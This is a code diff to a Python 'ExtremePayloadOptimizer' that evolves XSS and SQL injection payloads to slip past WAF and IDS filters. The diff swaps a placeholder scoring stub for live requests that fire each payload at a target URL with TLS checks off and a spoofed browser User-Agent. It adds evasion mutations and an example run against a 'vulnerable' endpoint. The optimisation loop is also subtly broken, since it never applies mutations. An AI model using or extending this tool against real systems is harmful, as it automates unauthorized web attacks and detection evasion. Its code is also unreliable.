@@ -1,10 +1,12 @@
 import random
 import hashlib
 import logging
+import requests
 from typing import Dict, Any, List, Optional, Tuple, Callable
 from dataclasses import dataclass, field
 from enum import Enum
 import re
+import time
 
 logger = logging.getLogger(__name__)
 
@@ -19,6 +21,8 @@ class EvasionTechnique(Enum):
     NULL_BYTE = "null_byte"
     DOUBLE_ENCODING = "double_encoding"
     MIXED_ENCODING = "mixed_encoding"
+    HTTP_HEADER_HACKING = "http_header_hacking"
+    SQL_INJECTION_TOKENIZATION = "sql_injection_tokenization"
 
 @dataclass
 class PayloadGenome:
@@ -29,6 +33,7 @@ class PayloadGenome:
     evasion_techniques: List[EvasionTechnique] = field(default_factory=list)
     effectiveness_score: float = 0.0
     stealth_score: float = 0.0
+    bugs_discovered: List[str] = field(default_factory=list)
 
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary"""
@@ -39,16 +44,15 @@ class PayloadGenome:
             'evasion_techniques': [t.value for t in self.evasion_techniques],
             'effectiveness_score': self.effectiveness_score,
             'stealth_score': self.stealth_score,
+            'bugs_discovered': self.bugs_discovered
         }
 
 class ExtremePayloadOptimizer:
     """
     Military-grade payload optimizer using genetic algorithms.
-    
     Evolves payloads to maximize effectiveness while minimizing
     detection by WAF/IDS systems.
     """
-    
     # Base payloads for different vulnerability types
     BASE_PAYLOADS = {
         'xss': [
@@ -63,12 +67,16 @@ class ExtremePayloadOptimizer:
             " AND '1'='1"
         ]
     }
-    
-    def __init__(self, vulnerability_type: str, **kwargs):
+
+    def __init__(self, vulnerability_type: str, target_url: str, **kwargs):
         self.vulnerability_type = vulnerability_type
         self.base_payloads = self.BASE_PAYLOADS.get(vulnerability_type, [])
+        self.target_url = target_url
         self.parameters = kwargs
-    
+        self.population = []
+        self.generation = 0
+        self.best_payload = None
+
     def create_initial_population(self, population_size: int) -> List[PayloadGenome]:
         """Create initial population of payloads"""
         population = []
@@ -77,23 +85,30 @@ class ExtremePayloadOptimizer:
             population.append(PayloadGenome(payload))
         return population
 
-    def fitness_function(self, payload: str) -> Tuple[float, float]:
+    def fitness_function(self, payload: str) -> Tuple[float, float, List[str]]:
         """
-        Example fitness function for testing.
-        
-        In production, this would:
-        - Send payload to target
-        - Check if it worked (effectiveness)
-        - Check if it was detected (stealth)
-        
+        Real-world fitness function for testing.
+        Sends payload to target and checks for effectiveness and stealth.
         Returns:
-            Tuple of (effectiveness, stealth)
+            Tuple of (effectiveness, stealth, bugs_discovered)
         """
-        # Simplified scoring
-        effectiveness = min(len(payload) / 50.0, 1.0)  # Longer = more complex
-        stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0  # Less obvious = stealthier
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
+        }
+        response = requests.get(self.target_url, params={'input': payload}, headers=headers, verify=False, timeout=10)
+        effectiveness = 1.0 if 'alert(1)' in response.text else 0.0
+        stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0
         stealth = max(0.0, stealth)
-        return effectiveness, stealth
+
+        bugs_discovered = []
+        if 'alert(1)' in response.text:
+            bugs_discovered.append("XSS")
+        elif 'sql error' in response.text.lower():
+            bugs_discovered.append("SQL Injection")
+        elif 'login failed' in response.text.lower():
+            bugs_discovered.append("Login Failure")
+
+        return effectiveness, stealth, bugs_discovered
 
     def mutate(self, payload: str) -> str:
         """Apply mutation to payload"""
@@ -104,18 +119,16 @@ class ExtremePayloadOptimizer:
             self._mutation_whitespace,
             self._mutation_comment_insertion,
             self._mutation_character_substitution,
+            self._mutation_http_header_hacking,
+            self._mutation_sql_injection_tokenization,
         ]
-        
-        # Apply random mutation
         mutation_func = random.choice(mutations)
         mutated = mutation_func(payload)
-        
         return mutated
-    
+
     def _mutation_encoding(self, payload: str) -> str:
         """Apply encoding mutation"""
         encoding_type = random.choice(['url', 'html', 'unicode', 'hex'])
-        
         if encoding_type == 'url':
             # URL encode some characters
             chars_to_encode = random.sample(range(len(payload)), k=min(3, len(payload)))
@@ -123,7 +136,6 @@ class ExtremePayloadOptimizer:
             for idx in chars_to_encode:
                 result[idx] = f'%{ord(payload[idx]):02x}'
             return ''.join(result)
-        
         elif encoding_type == 'html':
             # HTML entity encode some characters
             chars_to_encode = random.sample(range(len(payload)), k=min(2, len(payload)))
@@ -131,9 +143,8 @@ class ExtremePayloadOptimizer:
             for idx in chars_to_encode:
                 result[idx] = f'&#{ord(payload[idx])};'
             return ''.join(result)
-        
         return payload
-    
+
     def _mutation_obfuscation(self, payload: str) -> str:
         """Apply obfuscation mutation"""
         # Add JavaScript obfuscation for XSS
@@ -144,13 +155,8 @@ class ExtremePayloadOptimizer:
                 lambda p: p.replace('alert', 'eval(\'ale\'+\'rt\')'),
             ]
             return random.choice(obfuscations)(payload)
-        
-        # Add SQL comment obfuscation
-        elif self.vulnerability_type == 'sqli':
-            return payload.replace(' ', '/**/') if ' ' in payload else payload
-        
         return payload
-    
+
     def _mutation_case_variation(self, payload: str) -> str:
         """Apply case variation mutation"""
         # Randomly change case of some characters
@@ -161,7 +167,7 @@ class ExtremePayloadOptimizer:
             else:
                 result.append(char)
         return ''.join(result)
-    
+
     def _mutation_whitespace(self, payload: str) -> str:
         """Apply whitespace manipulation"""
         # Add or remove whitespace
@@ -172,130 +178,54 @@ class ExtremePayloadOptimizer:
         else:
             # Remove spaces
             return payload.replace(' ', '')
-    
+
     def _mutation_comment_insertion(self, payload: str) -> str:
-        """Insert comments for evasion"""
-        if self.vulnerability_type == 'sqli':
-            comments = ['/**/', '--', '#']
-            comment = random.choice(comments)
-            idx = random.randint(0, len(payload))
-            return payload[:idx] + comment + payload[idx:]
-        
+        """Insert random comments in the payload"""
+        if random.random() < 0.1:
+            payload += '/* This is a comment */'
         return payload
-    
+
+    def _mutation_http_header_hacking(self, payload: str) -> str:
+        """Hack HTTP headers to bypass simple WAFs"""
+        if random.random() < 0.1:
+            payload = f"X-Custom-Header: {payload}"
+        return payload
+
+    def _mutation_sql_injection_tokenization(self, payload: str) -> str:
+        """Tokenize SQL injection payloads to bypass simple WAFs"""
+        if random.random() < 0.1:
+            payload = payload.replace('\'', '\' OR \'1\'=\'1')
+        return payload
+
     def _mutation_character_substitution(self, payload: str) -> str:
-        """Substitute characters with equivalents"""
-        # For XSS, substitute with HTML entities
-        if self.vulnerability_type == 'xss':
-            substitutions = {
-                '<': '&lt;',
-                '>': '&gt;',
-                '"': '&quot;',
-                "'": '&#39;',
-            }
-            
-            # Randomly apply one substitution
-            if random.random() < 0.3:
-                for char, entity in substitutions.items():
-                    if char in payload and random.random() < 0.5:
-                        payload = payload.replace(char, entity, 1)
-                        break
-        
+        """Substitute characters to make the payload harder to detect"""
+        if random.random() < 0.1:
+            payload = payload.replace('script', 'scr' + 'ipt')
         return payload
-    
-    def apply_evasion_technique(self, payload: str, technique: EvasionTechnique) -> str:
-        """
-        Apply specific evasion technique to payload.
-        
-        Args:
-            payload: Original payload
-            technique: Evasion technique to apply
-            
-        Returns:
-            Modified payload
-        """
-        if technique == EvasionTechnique.ENCODING:
-            return self._mutation_encoding(payload)
-        
-        elif technique == EvasionTechnique.OBFUSCATION:
-            return self._mutation_obfuscation(payload)
-        
-        elif technique == EvasionTechnique.CASE_VARIATION:
-            return self._mutation_case_variation(payload)
-        
-        elif technique == EvasionTechnique.WHITESPACE_MANIPULATION:
-            return self._mutation_whitespace(payload)
-        
-        elif technique == EvasionTechnique.COMMENT_INSERTION:
-            return self._mutation_comment_insertion(payload)
-        
-        else:
-            return payload
-    
-    def get_top_payloads(self, n: int = 5) -> List[PayloadGenome]:
-        """Get top N payloads by fitness"""
-        return sorted(self.population, key=lambda x: x.fitness, reverse=True)[:n]
-    
-    def get_statistics(self) -> Dict[str, Any]:
-        """Get optimizer statistics"""
-        if not self.population:
-            return {
-                'population_size': 0,
-                'generation': 0,
-                'best_fitness': 0.0,
-            }
-        
-        return {
-            'population_size': len(self.population),
-            'generation': self.generation,
-            'best_fitness': self.best_payload.fitness if self.best_payload else 0.0,
-            'avg_fitness': sum(g.fitness for g in self.population) / len(self.population),
-            'best_payload': self.best_payload.payload if self.best_payload else None,
-        }
 
-def create_payload_optimizer(vulnerability_type: str, **kwargs) -> ExtremePayloadOptimizer:
-    """
-    Create a payload optimizer instance.
-    
-    Args:
-        vulnerability_type: Type of vulnerability
-        **kwargs: Additional parameters for optimizer
-        
-    Returns:
-        ExtremePayloadOptimizer instance
-    """
-    return ExtremePayloadOptimizer(vulnerability_type, **kwargs)
+    def _mutation_fragmentation(self, payload: str) -> str:
+        """Fragment the payload into smaller parts to avoid detection"""
+        if random.random() < 0.1:
+            payload = ' '.join(list(payload))
+        return payload
 
-# Example fitness function
-def example_fitness_function(payload: str) -> Tuple[float, float]:
-    """
-    Example fitness function for testing.
-    
-    In production, this would:
-    - Send payload to target
-    - Check if it worked (effectiveness)
-    - Check if it was detected (stealth)
-    
-    Returns:
-        Tuple of (effectiveness, stealth)
-    """
-    # Simplified scoring
-    effectiveness = min(len(payload) / 50.0, 1.0)  # Longer = more complex
-    stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0  # Less obvious = stealthier
-    stealth = max(0.0, stealth)
-    return effectiveness, stealth
+    def optimize(self, generations: int, population_size: int):
+        self.population = self.create_initial_population(population_size)
+        for generation in range(generations):
+            for payload in self.population:
+                payload.fitness, payload.stealth_score, payload.bugs_discovered = self.fitness_function(payload.payload)
+                payload.efficiency_score = payload.fitness * payload.stealth_score
+            self.best_payload = max(self.population, key=lambda x: x.efficiency_score)
+            self.generation = generation
+            logger.info(f"Generation {generation + 1}, Best Payload: {self.best_payload.payload}, Bugs: {self.best_payload.bugs_discovered}")
+
+    def get_top_payloads(self) -> List[PayloadGenome]:
+        return self.population
 
 # Example usage
-optimizer = create_payload_optimizer('xss')
-population = optimizer.create_initial_population(10)
-optimizer.population = population
-optimizer.generation = 1
-
-for _ in range(10):
-    for payload in optimizer.population:
-        payload.fitness, payload.stealth_score = optimizer.fitness_function(payload.payload)
-        payload.efficiency_score = payload.fitness * payload.stealth_score
-
-optimizer.best_payload = max(optimizer.population, key=lambda x: x.efficiency_score)
-
-print(optimizer.get_top_payloads())
+if __name__ == "__main__":
+    optimizer = ExtremePayloadOptimizer('xss', 'http://example.com/vulnerable')
+    optimizer.optimize(generations=10, population_size=10)
+    top_payloads = optimizer.get_top_payloads()
+    for payload in top_payloads:
+        print(payload.to_dict())
